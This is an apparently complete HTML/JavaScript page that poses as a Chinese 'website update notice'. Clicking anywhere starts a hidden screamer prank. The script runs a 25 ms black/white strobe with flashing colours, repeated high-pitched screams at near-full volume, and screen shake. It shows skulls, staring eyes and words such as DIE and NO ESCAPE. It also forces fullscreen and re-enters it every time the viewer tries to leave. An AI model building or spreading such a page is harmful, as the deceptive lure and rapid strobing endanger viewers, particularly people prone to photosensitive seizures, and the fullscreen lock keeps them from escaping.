<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>✨ 网站更新</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body {
            background: #f0f4f8;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: pointer;
            font-family: 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
        }

        .start-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(240, 244, 248, 0.78);
            backdrop-filter: blur(12px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            color: #2c3e50;
            text-align: center;
            cursor: pointer;
            transition: opacity 0.15s;
        }
        .update-card {
            background: rgba(255, 255, 255, 0.92);
            border-radius: 32px;
            padding: 40px 48px;
            max-width: 420px;
            width: 85%;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.06);
            animation: floatCard 3s ease-in-out infinite;
            pointer-events: auto; /* 确保卡片可点击 */
        }
        @keyframes floatCard {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }
        .update-icon {
            font-size: 4rem;
            margin-bottom: 12px;
        }
        .update-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #11998e, #38ef7d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            letter-spacing: 2px;
        }
        .update-message {
            font-size: 1rem;
            color: #4a5568;
            line-height: 1.7;
            margin-bottom: 26px;
        }
        .update-btn {
            background: linear-gradient(135deg, #11998e, #38ef7d);
            color: white;
            border: none;
            font-size: 1.3rem;
            font-weight: 700;
            padding: 16px 44px;
            border-radius: 60px;
            cursor: pointer;
            letter-spacing: 2px;
            box-shadow: 0 10px 30px rgba(17, 153, 142, 0.3);
            transition: transform 0.15s;
            outline: none;
            pointer-events: auto;
            z-index: 10001;
            position: relative;
        }
        .update-btn:hover {
            transform: scale(1.04);
        }
        .update-btn:active {
            transform: scale(0.94);
        }
        .fine-print {
            color: #a0aec0;
            font-size: 0.82rem;
            margin-top: 14px;
        }

        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 999;
        }

        #strobeOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 997;
            background: transparent;
        }
        #terrorBorder {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 998;
            border: 8px solid transparent;
            box-sizing: border-box;
        }
        .scare-popup {
            position: fixed;
            font-family: 'Impact', 'Creepy', fantasy;
            color: #ff0000;
            font-size: 4rem;
            pointer-events: none;
            z-index: 1001;
            text-shadow: 0 0 40px #000, 0 0 80px #ff0000;
            animation: popIn 0.15s ease-out forwards;
        }
        @keyframes popIn {
            0% { transform: scale(0) rotate(-20deg); opacity: 0; }
            60% { transform: scale(1.8) rotate(5deg); opacity: 1; }
            100% { transform: scale(1) rotate(0deg); opacity: 0.9; }
        }
    </style>
</head>
<body>

    <div class="start-overlay" id="startOverlay">
        <div class="update-card">
            <div class="update-icon">✨</div>
            <div class="update-title">网站更新公告</div>
            <div class="update-message">
                我们刚刚完成了新一轮升级，<br>带来了更流畅的体验与全新界面。<br>点击下方按钮立即查看新内容。
            </div>
            <button class="update-btn" id="updateButton">🎉 立即体验</button>
            <div class="fine-print">或点击任意位置继续</div>
        </div>
    </div>

    <canvas id="skullCanvas"></canvas>
    <div id="strobeOverlay"></div>
    <div id="terrorBorder"></div>

    <script>
        (function() {
            let isActive = false;
            let audioCtx = null;
            let animFrame = null;
            let canvas = document.getElementById('skullCanvas');
            let ctx = canvas.getContext('2d');
            let skulls = [];
            let emojiSkulls = [];
            let ghostEmojis = [];
            let redTexts = [];
            let width, height;
            let strobeDiv = document.getElementById('strobeOverlay');
            let terrorBorder = document.getElementById('terrorBorder');
            let bgFlashInterval = null;
            let strobeInterval = null;
            let mouseX = -1000, mouseY = -1000;

            // 鼠标跟踪
            document.addEventListener('mousemove', (e) => {
                mouseX = e.clientX;
                mouseY = e.clientY;
            });
            document.addEventListener('touchmove', (e) => {
                if (e.touches.length > 0) {
                    mouseX = e.touches[0].clientX;
                    mouseY = e.touches[0].clientY;
                }
            });

            function resizeCanvas() {
                width = window.innerWidth;
                height = window.innerHeight;
                canvas.width = width;
                canvas.height = height;
            }
            window.addEventListener('resize', resizeCanvas);

            // 绘制眼球
            function drawEye(x, y, size, lookX, lookY) {
                if (!ctx) return;
                ctx.save();
                ctx.beginPath();
                ctx.arc(x, y, size, 0, Math.PI*2);
                ctx.fillStyle = '#fff';
                ctx.fill();
                ctx.strokeStyle = '#440000';
                ctx.lineWidth = size*0.15;
                ctx.stroke();
                for(let i=0; i<8; i++) {
                    ctx.beginPath();
                    const angle = (i/8)*Math.PI*2;
                    ctx.moveTo(x+Math.cos(angle)*size*0.4, y+Math.sin(angle)*size*0.4);
                    ctx.lineTo(x+Math.cos(angle)*size*0.9, y+Math.sin(angle)*size*0.9);
                    ctx.strokeStyle = 'rgba(180,0,0,0.6)';
                    ctx.lineWidth = size*0.03;
                    ctx.stroke();
                }
                const dx = lookX - x;
                const dy = lookY - y;
                const dist = Math.sqrt(dx*dx+dy*dy) || 1;
                const maxOffset = size*0.35;
                const offsetX = (dx/dist)*Math.min(dist*0.05, maxOffset);
                const offsetY = (dy/dist)*Math.min(dist*0.05, maxOffset);
                ctx.beginPath();
                ctx.arc(x+offsetX, y+offsetY, size*0.4, 0, Math.PI*2);
                ctx.fillStyle = '#000';
                ctx.fill();
                ctx.beginPath();
                ctx.arc(x+offsetX-size*0.12, y+offsetY-size*0.12, size*0.12, 0, Math.PI*2);
                ctx.fillStyle = '#fff';
                ctx.fill();
                ctx.restore();
            }

            // 绘制恐怖骷髅
            function drawSkull(x, y, size) {
                if(!ctx) return;
                ctx.save();
                ctx.shadowBlur = size*0.6;
                ctx.shadowColor = '#ff0000';
                ctx.beginPath();
                ctx.arc(x, y, size*0.5, 0, Math.PI*2);
                ctx.fillStyle = "#d0d0d0";
                ctx.fill();
                ctx.strokeStyle = "#550000";
                ctx.lineWidth = size*0.13;
                ctx.stroke();
                ctx.beginPath();
                ctx.moveTo(x-size*0.4, y-size*0.3);
                ctx.lineTo(x-size*0.1, y-size*0.05);
                ctx.lineTo(x-size*0.2, y+size*0.15);
                ctx.strokeStyle = "#880000";
                ctx.lineWidth = size*0.07;
                ctx.stroke();
                ctx.beginPath();
                ctx.moveTo(x+size*0.3, y-size*0.35);
                ctx.lineTo(x+size*0.1, y-size*0.15);
                ctx.lineTo(x+size*0.15, y+size*0.1);
                ctx.stroke();
                ctx.fillStyle = "#000";
                ctx.shadowColor = '#ff0000';
                ctx.shadowBlur = size*0.8;
                ctx.beginPath();
                ctx.arc(x-size*0.2, y-size*0.15, size*0.15, 0, Math.PI*2);
                ctx.fill();
                ctx.beginPath();
                ctx.arc(x+size*0.2, y-size*0.15, size*0.15, 0, Math.PI*2);
                ctx.fill();
                ctx.shadowBlur = 0;
                ctx.beginPath();
                ctx.moveTo(x, y-size*0.06);
                ctx.lineTo(x-size*0.1, y+size*0.12);
                ctx.lineTo(x+size*0.1, y+size*0.12);
                ctx.fillStyle = "#111";
                ctx.fill();
                ctx.fillStyle = "#3a0000";
                for(let i=-0.35; i<=0.35; i+=0.17) {
                    ctx.beginPath();
                    ctx.moveTo(x+i*size, y+size*0.2);
                    ctx.lineTo(x+i*size+size*0.08, y+size*0.3);
                    ctx.lineTo(x+i*size-size*0.08, y+size*0.3);
                    ctx.fill();
                }
                ctx.fillStyle = "rgba(30,0,0,0.5)";
                ctx.beginPath();
                ctx.arc(x-size*0.35, y, size*0.22, 0, Math.PI*2);
                ctx.fill();
                ctx.beginPath();
                ctx.arc(x+size*0.35, y, size*0.22, 0, Math.PI*2);
                ctx.fill();
                ctx.restore();
            }

            function generateSkulls(count=30) {
                skulls=[];
                for(let i=0; i<count; i++) {
                    skulls.push({
                        x: Math.random()*width,
                        y: Math.random()*height,
                        size: 45+Math.random()*120,
                        vx: (Math.random()-0.5)*26,
                        vy: (Math.random()-0.5)*26
                    });
                }
            }
            function generateEmojiSkulls(count=45) {
                emojiSkulls=[];
                for(let i=0; i<count; i++) {
                    emojiSkulls.push({
                        x: Math.random()*width,
                        y: Math.random()*height,
                        size: 35+Math.random()*90,
                        vx: (Math.random()-0.5)*14,
                        vy: (Math.random()-0.5)*14
                    });
                }
            }
            function generateGhosts(count=30) {
                ghostEmojis=[];
                for(let i=0; i<count; i++) {
                    ghostEmojis.push({
                        x: Math.random()*width,
                        y: Math.random()*height,
                        size: 40+Math.random()*100,
                        vx: (Math.random()-0.5)*18,
                        vy: (Math.random()-0.5)*18
                    });
                }
            }

            function spawnRedText() {
                if(!isActive) return;
                const texts = ['RUN','HELP','DIE','FEAR','NO ESCAPE','HAHAHA','666','DEAD','PAIN','SCREAM'];
                redTexts.push({
                    x: Math.random()*width,
                    y: Math.random()*height,
                    text: texts[Math.floor(Math.random()*texts.length)],
                    size: 30+Math.random()*85,
                    alpha: 1
                });
                if(redTexts.length>55) redTexts.shift();
            }
            function spawnPopupScare() {
                if(!isActive) return;
                const popup = document.createElement('div');
                popup.className = 'scare-popup';
                const msgs = ['WAKE UP','HELP','666','DIE','LOOK','👁️','RUN'];
                popup.textContent = msgs[Math.floor(Math.random()*msgs.length)];
                popup.style.left = Math.random()*75+'%';
                popup.style.top = Math.random()*75+'%';
                popup.style.fontSize = (2+Math.random()*5)+'rem';
                document.body.appendChild(popup);
                setTimeout(() => { if(popup.parentNode) popup.remove(); }, 350);
            }

            function drawAll() {
                if(!isActive || !ctx) return;
                ctx.clearRect(0,0,width,height);

                // 跟随鼠标的眼球
                if(mouseX>-500 && mouseX<width+500 && mouseY>-500 && mouseY<height+500) {
                    for(let i=0; i<3; i++) {
                        const ex = mouseX + (Math.random()-0.5)*200;
                        const ey = mouseY + (Math.random()-0.5)*200;
                        drawEye(
                            Math.max(30, Math.min(width-30, ex)),
                            Math.max(30, Math.min(height-30, ey)),
                            25+Math.random()*45,
                            mouseX, mouseY
                        );
                    }
                }

                // 骷髅
                for(let s of skulls) {
                    drawSkull(s.x, s.y, s.size);
                    s.x += s.vx;
                    s.y += s.vy;
                    if(s.x<-180) s.x=width+100;
                    if(s.x>width+180) s.x=-100;
                    if(s.y<-180) s.y=height+100;
                    if(s.y>height+180) s.y=-100;
                    s.vx += (Math.random()-0.5)*3.5;
                    s.vy += (Math.random()-0.5)*3.5;
                    let max=30;
                    if(Math.abs(s.vx)>max) s.vx*=0.9;
                    if(Math.abs(s.vy)>max) s.vy*=0.9;
                }

                ctx.textAlign="center";
                ctx.textBaseline="middle";
                for(let e of emojiSkulls) {
                    ctx.save();
                    ctx.shadowColor="#ff0000";
                    ctx.shadowBlur=20;
                    ctx.font = `${e.size}px "Segoe UI Emoji"`;
                    ctx.fillText('💀', e.x, e.y);
                    ctx.restore();
                    e.x += e.vx;
                    e.y += e.vy;
                    if(e.x<-80) e.x=width+40;
                    if(e.x>width+80) e.x=-40;
                    if(e.y<-80) e.y=height+40;
                    if(e.y>height+80) e.y=-40;
                    e.vx += (Math.random()-0.5)*3;
                    e.vy += (Math.random()-0.5)*3;
                    if(Math.abs(e.vx)>16) e.vx*=0.87;
                    if(Math.abs(e.vy)>16) e.vy*=0.87;
                }
                for(let g of ghostEmojis) {
                    ctx.save();
                    ctx.shadowColor="#ff00ff";
                    ctx.shadowBlur=25;
                    ctx.font = `${g.size}px "Segoe UI Emoji"`;
                    ctx.fillText('👻', g.x, g.y);
                    ctx.restore();
                    g.x += g.vx;
                    g.y += g.vy;
                    if(g.x<-80) g.x=width+40;
                    if(g.x>width+80) g.x=-40;
                    if(g.y<-80) g.y=height+40;
                    if(g.y>height+80) g.y=-40;
                    g.vx += (Math.random()-0.5)*3.5;
                    g.vy += (Math.random()-0.5)*3.5;
                    if(Math.abs(g.vx)>20) g.vx*=0.87;
                    if(Math.abs(g.vy)>20) g.vy*=0.87;
                }

                // 恐怖文字
                for(let i=redTexts.length-1; i>=0; i--) {
                    let rt = redTexts[i];
                    ctx.save();
                    ctx.globalAlpha = rt.alpha;
                    ctx.shadowColor='#ff0000';
                    ctx.shadowBlur=35;
                    ctx.fillStyle='#ff0000';
                    ctx.font = `bold ${rt.size}px "Impact", fantasy`;
                    ctx.fillText(rt.text, rt.x, rt.y);
                    ctx.restore();
                    rt.alpha -= 0.022;
                    if(rt.alpha<=0) redTexts.splice(i,1);
                }

                if(Math.random()<0.3) {
                    canvas.style.filter = `invert(${Math.random()}) hue-rotate(${Math.random()*360}deg)`;
                    setTimeout(()=>{ canvas.style.filter='none'; }, 45);
                }
                if(Math.random()<0.45) {
                    document.body.style.transform = `translate(${(Math.random()-0.5)*16}px, ${(Math.random()-0.5)*16}px)`;
                    setTimeout(()=>{ document.body.style.transform='none'; }, 30);
                }

                animFrame = requestAnimationFrame(drawAll);
            }

            function startStrobe() {
                if(strobeInterval) clearInterval(strobeInterval);
                let isBlack = false;
                strobeInterval = setInterval(() => {
                    if(!isActive) return;
                    isBlack = !isBlack;
                    strobeDiv.style.background = isBlack ? 'black' : 'white';
                    terrorBorder.style.borderColor = isBlack ? '#ff0000' : '#000000';
                }, 25);
            }
            function startBgFlash() {
                if(bgFlashInterval) clearInterval(bgFlashInterval);
                const colors = ['#000','#fff','#ff0000','#000','#fff','#ff0000','#000','#000','#ff0000','#000'];
                bgFlashInterval = setInterval(() => {
                    if(!isActive) return;
                    document.body.style.backgroundColor = colors[Math.floor(Math.random()*colors.length)];
                }, 35);
            }

            // ★ 高频尖叫：每秒4-5次，频率更高 ★
            function createAndPlaySound() {
                if(!audioCtx) {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                }
                if(audioCtx.state === 'suspended') {
                    audioCtx.resume();
                }

                function makeHighPitchScream() {
                    const now = audioCtx.currentTime;

                    // 1. 极高频率爆音
                    const oscB = audioCtx.createOscillator();
                    const gainB = audioCtx.createGain();
                    oscB.connect(gainB); gainB.connect(audioCtx.destination);
                    oscB.type = 'square';
                    oscB.frequency.setValueAtTime(4000, now);
                    oscB.frequency.exponentialRampToValueAtTime(200, now + 0.1);
                    gainB.gain.setValueAtTime(1.0, now);
                    gainB.gain.exponentialRampToValueAtTime(0.001, now + 0.18);
                    oscB.start(now); oscB.stop(now + 0.18);

                    // 2. 锯齿波尖叫 (高频下滑)
                    const osc1 = audioCtx.createOscillator();
                    const gain1 = audioCtx.createGain();
                    osc1.connect(gain1); gain1.connect(audioCtx.destination);
                    osc1.type = 'sawtooth';
                    osc1.frequency.setValueAtTime(3500, now);
                    osc1.frequency.exponentialRampToValueAtTime(120, now + 0.2);
                    gain1.gain.setValueAtTime(0.85, now);
                    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
                    osc1.start(now); osc1.stop(now + 0.35);

                    // 3. 叠加高频振荡
                    const osc2 = audioCtx.createOscillator();
                    const gain2 = audioCtx.createGain();
                    osc2.connect(gain2); gain2.connect(audioCtx.destination);
                    osc2.type = 'triangle';
                    osc2.frequency.setValueAtTime(2500, now + 0.05);
                    osc2.frequency.linearRampToValueAtTime(600, now + 0.25);
                    gain2.gain.setValueAtTime(0.7, now + 0.05);
                    gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.4);
                    osc2.start(now + 0.05); osc2.stop(now + 0.4);

                    // 4. 低音震颤
                    const osc3 = audioCtx.createOscillator();
                    const gain3 = audioCtx.createGain();
                    osc3.connect(gain3); gain3.connect(audioCtx.destination);
                    osc3.type = 'square';
                    osc3.frequency.setValueAtTime(300, now);
                    osc3.frequency.exponentialRampToValueAtTime(20, now + 0.35);
                    gain3.gain.setValueAtTime(0.65, now);
                    gain3.gain.exponentialRampToValueAtTime(0.001, now + 0.55);
                    osc3.start(now); osc3.stop(now + 0.55);
                }

                makeHighPitchScream();

                // 循环间隔：200-250ms -> 每秒4-5次
                const delay = 200 + Math.floor(Math.random() * 50); // 200-250ms
                setTimeout(() => {
                    if(isActive) createAndPlaySound();
                }, delay);
            }

            function goFullscreen() {
                const elem = document.documentElement;
                if(elem.requestFullscreen) elem.requestFullscreen().catch(()=>{});
            }

            // 主触发函数
            function activatePrank() {
                if(isActive) return;
                isActive = true;

                const overlay = document.getElementById('startOverlay');
                if(overlay) overlay.style.display = 'none';

                // 同步启动声音
                createAndPlaySound();

                resizeCanvas();
                generateSkulls(35);
                generateEmojiSkulls(50);
                generateGhosts(35);
                redTexts = [];

                drawAll();
                startStrobe();
                startBgFlash();

                goFullscreen();
                setTimeout(goFullscreen, 200);

                setInterval(() => {
                    if(isActive && !document.fullscreenElement) goFullscreen();
                }, 700);

                setInterval(() => { if(isActive) spawnRedText(); }, 280);
                setInterval(() => { if(isActive) spawnPopupScare(); }, 550);

                document.addEventListener('fullscreenchange', () => {
                    if(!document.fullscreenElement && isActive) setTimeout(goFullscreen, 100);
                });

                // 持续补充实体
                setInterval(() => {
                    if(!isActive) return;
                    skulls.push({ x:Math.random()*width, y:Math.random()*height, size:45+Math.random()*120, vx:(Math.random()-0.5)*30, vy:(Math.random()-0.5)*30 });
                    if(skulls.length>80) skulls.shift();
                }, 1100);
                setInterval(() => {
                    if(!isActive) return;
                    emojiSkulls.push({ x:Math.random()*width, y:Math.random()*height, size:35+Math.random()*90, vx:(Math.random()-0.5)*16, vy:(Math.random()-0.5)*16 });
                    if(emojiSkulls.length>90) emojiSkulls.shift();
                }, 950);
                setInterval(() => {
                    if(!isActive) return;
                    ghostEmojis.push({ x:Math.random()*width, y:Math.random()*height, size:40+Math.random()*110, vx:(Math.random()-0.5)*20, vy:(Math.random()-0.5)*20 });
                    if(ghostEmojis.length>70) ghostEmojis.shift();
                }, 1300);
            }

            // 简化的事件绑定，确保按钮可点
            const updateBtn = document.getElementById('updateButton');
            const overlayDiv = document.getElementById('startOverlay');

            // 移除可能存在的旧事件（简单覆盖）
            updateBtn.onclick = (e) => {
                e.stopPropagation();
                e.preventDefault();
                activatePrank();
            };
            overlayDiv.onclick = (e) => {
                if(e.target === updateBtn) return;
                e.preventDefault();
                activatePrank();
            };
            // 备用：body点击也能触发（但防止重复触发）
            document.body.addEventListener('click', function onceHandler(e) {
                if(!isActive) {
                    e.preventDefault();
                    activatePrank();
                }
                document.body.removeEventListener('click', onceHandler);
            });
        })();
    </script>
</body>
</html>
